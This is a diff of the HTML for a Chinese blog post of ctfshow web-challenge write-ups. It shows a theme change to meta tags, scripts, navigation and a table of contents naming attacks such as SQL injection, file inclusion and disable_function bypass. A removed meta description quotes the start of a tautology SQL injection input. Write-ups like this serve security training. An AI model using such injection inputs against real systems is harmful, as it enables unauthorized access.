@@ -1,18 +1,51 @@
 <!DOCTYPE html>
-<html lang=en>
+<html lang="zh-CN">
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="0x01前言因为这里的题有些也是比较简单的，所以这里的知识点和做法不会讲述特别多，不会的可以直接看其他文章的题目有写的很详细的 0x02web题目web签到题#源码泄露查看源代码然后拿去进行base64编码就可以拿到flag了 web2#mysql联合注入最简单的sql注入  进来是一个，页面源代码也没什么可用的信息，那我们就测试一下 先用永真语句打一下 1username&#x3D;1&#x27; or">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta name="description" content="ctfshow之web专题">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ctfshow之web专题">
 <meta property="og:url" content="https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/index.html">
 <meta property="og:site_name" content="root@wanth3f1ag">
-<meta property="og:description" content="0x01前言因为这里的题有些也是比较简单的，所以这里的知识点和做法不会讲述特别多，不会的可以直接看其他文章的题目有写的很详细的 0x02web题目web签到题#源码泄露查看源代码然后拿去进行base64编码就可以拿到flag了 web2#mysql联合注入最简单的sql注入  进来是一个，页面源代码也没什么可用的信息，那我们就测试一下 先用永真语句打一下 1username&#x3D;1&#x27; or">
-<meta property="og:locale" content="en_US">
+<meta property="og:description" content="ctfshow之web专题">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204212546700.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204214741542.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204215434905.png">
@@ -78,176 +111,287 @@
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250311172721888.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250619130028896.png">
 <meta property="article:published_time" content="2025-03-10T14:32:06.000Z">
-<meta property="article:modified_time" content="2025-06-19T05:35:48.882Z">
+<meta property="article:modified_time" content="2025-12-01T11:19:20.918Z">
 <meta property="article:author" content="wanTh3flag">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241204212546700.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>ctfshow之web专题</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
 
 
-    <!-- Umami Analytics -->
+<link rel="canonical" href="https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/">
 
 
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/","path":"2025/03/10/ctfshow之web专题/","title":"ctfshow之web专题"}</script>
 
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-
-<meta name="generator" content="Hexo 7.3.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">H0me</a></li><!--
-     --><!--
-       --><li><a href="/about/">A6out</a></li><!--
-     --><!--
-       --><li><a href="/tags/">T6gs</a></li><!--
-     --><!--
-       --><li><a href="/categories/">Catagory</a></li><!--
-     --><!--
-       --><li><a href="/links/">L1nks</a></li><!--
-     --><!--
-       --><li><a href="/search/">s4arch</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/2025/03/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A7%AF%E7%B4%AF/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/2025/03/05/ctfshow%E6%91%86%E7%83%82%E6%9D%AF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&text=ctfshow之web专题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&title=ctfshow之web专题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&is_video=false&description=ctfshow之web专题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=ctfshow之web专题&body=Check out this article: https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&title=ctfshow之web专题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&title=ctfshow之web专题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&title=ctfshow之web专题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&title=ctfshow之web专题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&name=ctfshow之web专题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/03/10/ctfshow%E4%B9%8Bweb%E4%B8%93%E9%A2%98/&t=ctfshow之web专题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02web%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">0x02web题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">web签到题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">2.1.1.</span> <span class="toc-text">#源码泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-number">2.2.</span> <span class="toc-text">web2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">#mysql联合注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3"><span class="toc-number">2.3.</span> <span class="toc-text">web3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.3.1.</span> <span class="toc-text">#include文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web4"><span class="toc-number">2.4.</span> <span class="toc-text">web4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.1.</span> <span class="toc-text">#日志注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web5"><span class="toc-number">2.5.</span> <span class="toc-text">web5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E6%AF%94%E8%BE%83MD5"><span class="toc-number">2.5.1.</span> <span class="toc-text">#弱比较MD5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctype-alpha-v1"><span class="toc-number">2.5.2.</span> <span class="toc-text">ctype_alpha($v1)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#is-numeric-v2"><span class="toc-number">2.5.3.</span> <span class="toc-text">is_numeric($v2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A4%B4%E4%B8%BA0E%EF%BC%88MD5%E5%80%BC%E7%A2%B0%E6%92%9E%EF%BC%89"><span class="toc-number">2.5.4.</span> <span class="toc-text">开头为0E（MD5值碰撞）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web6"><span class="toc-number">2.6.</span> <span class="toc-text">web6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%9A%84%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.1.</span> <span class="toc-text">#过滤空格的联合注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web7"><span class="toc-number">2.7.</span> <span class="toc-text">web7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B-%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">2.7.1.</span> <span class="toc-text">#数字型+引号过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web8"><span class="toc-number">2.8.</span> <span class="toc-text">web8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7"><span class="toc-number">2.8.1.</span> <span class="toc-text">#布尔盲注+过滤逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%80%97%E5%8F%B7"><span class="toc-number">2.8.2.</span> <span class="toc-text">绕过逗号</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#from-for"><span class="toc-number">2.8.2.1.</span> <span class="toc-text">from for</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">2.8.3.</span> <span class="toc-text">布尔盲注脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web9"><span class="toc-number">2.9.</span> <span class="toc-text">web9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MD5%E7%9A%84sql"><span class="toc-number">2.9.1.</span> <span class="toc-text">#MD5的sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MD5-SQL%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.9.2.</span> <span class="toc-text">MD5 SQL绕过漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#md5-string-raw-%E5%87%BD%E6%95%B0"><span class="toc-number">2.9.2.1.</span> <span class="toc-text">md5(string,raw)函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web10"><span class="toc-number">2.10.</span> <span class="toc-text">web10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%9E%84%E9%80%A0%E7%BB%95%E8%BF%87"><span class="toc-number">2.10.1.</span> <span class="toc-text">#虚拟表构造绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysqli-query-%E5%87%BD%E6%95%B0"><span class="toc-number">2.10.2.</span> <span class="toc-text">mysqli_query()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysqli-num-rows-%E5%87%BD%E6%95%B0"><span class="toc-number">2.10.3.</span> <span class="toc-text">mysqli_num_rows()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s%E7%AC%A6%E5%8F%B7"><span class="toc-number">2.10.4.</span> <span class="toc-text">\s符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E8%A1%A8with-rollup%E7%BB%95%E8%BF%87"><span class="toc-number">2.10.5.</span> <span class="toc-text">构建虚拟表with rollup绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web11"><span class="toc-number">2.11.</span> <span class="toc-text">web11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E4%BC%AA%E9%80%A0"><span class="toc-number">2.11.1.</span> <span class="toc-text">#session伪造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web12"><span class="toc-number">2.12.</span> <span class="toc-text">web12</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87disable-function"><span class="toc-number">2.12.1.</span> <span class="toc-text">#绕过disable_function</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%BC%B9"><span class="toc-number">2.13.</span> <span class="toc-text">红包题第二弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE"><span class="toc-number">2.13.1.</span> <span class="toc-text">#无数字字母RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web13"><span class="toc-number">2.14.</span> <span class="toc-text">web13</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.14.1.</span> <span class="toc-text">#.user.ini文件上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web14"><span class="toc-number">2.15.</span> <span class="toc-text">web14</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-mysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">2.15.1.</span> <span class="toc-text">#无列名注入+mysql读取文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E5%85%AD%E5%BC%B9"><span class="toc-number">2.16.</span> <span class="toc-text">红包题第六弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%A2%B0%E6%92%9E-%E6%96%87%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">2.16.1.</span> <span class="toc-text">#强碰撞+文件竞争</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%B8%83%E5%BC%B9"><span class="toc-number">2.17.</span> <span class="toc-text">红包题第七弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#git%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2-%E7%BB%95%E8%BF%87disable-function"><span class="toc-number">2.17.1.</span> <span class="toc-text">#.git文件泄露+绕过disable_function</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%90%8C%E6%96%B0%E4%B8%93%E5%B1%9E%E7%BA%A2%E5%8C%85%E9%A2%98"><span class="toc-number">2.18.</span> <span class="toc-text">萌新专属红包题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="toc-number">2.18.1.</span> <span class="toc-text">#弱口令爆破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFshow-web1"><span class="toc-number">2.19.</span> <span class="toc-text">CTFshow web1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.19.1.</span> <span class="toc-text">#布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#game-gyctf-web2"><span class="toc-number">2.20.</span> <span class="toc-text">game-gyctf web2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">2.20.1.</span> <span class="toc-text">#反序列化字符串逃逸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web15-Fishman"><span class="toc-number">2.21.</span> <span class="toc-text">web15 Fishman</span></a></li></ol></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        ctfshow之web专题
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">wanTh3flag</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2025-03-10T14:32:06.000Z" class="dt-published" itemprop="datePublished">2025-03-10</time>
-        
-        (Updated: <time datetime="2025-06-19T05:35:48.882Z" class="dt-updated" itemprop="dateModified">2025-06-19</time>)
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/ctfshow/">ctfshow</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/web/" rel="tag">web</a>
-    </div>
-
-
-    </div>
-  </header>
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ctfshow之web专题 | root@wanth3f1ag</title>
   
 
-  <div class="content e-content" itemprop="articleBody">
-    <h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>因为这里的题有些也是比较简单的，所以这里的知识点和做法不会讲述特别多，不会的可以直接看其他文章的题目有写的很详细的</p>
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x01前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02web%E9%A2%98%E7%9B%AE"><span class="nav-number">2.</span> <span class="nav-text">0x02web题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">2.1.</span> <span class="nav-text">web签到题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="nav-number">2.1.1.</span> <span class="nav-text">#源码泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2"><span class="nav-number">2.2.</span> <span class="nav-text">web2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.1.</span> <span class="nav-text">#mysql联合注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" 